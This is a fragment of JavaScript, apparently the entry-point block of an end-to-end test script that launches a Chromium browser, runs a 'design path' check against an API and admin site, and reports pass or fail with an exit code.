const isEntryPoint = Boolean(process.argv[1]) && import.meta.url === pathToFileURL(process.argv[1]).href;
if (isEntryPoint) {
  console.log(`E2E design path against ${API} / ${ADMIN_BASE()} (run ${runID})`);
  const browser = await chromium.launch();
  try {
    await runDesignPath(browser);
  } catch (err) {
    fail(`design path aborted: ${err?.stack ?? err}`);
  } finally {
    await browser.close();
  }
  if (failureCount() > 0) {
    console.error(`\nE2E design path FAILED with ${failureCount()} failed check(s)`);
    process.exit(1);
  }
  console.log("\nE2E design path PASSED");
}
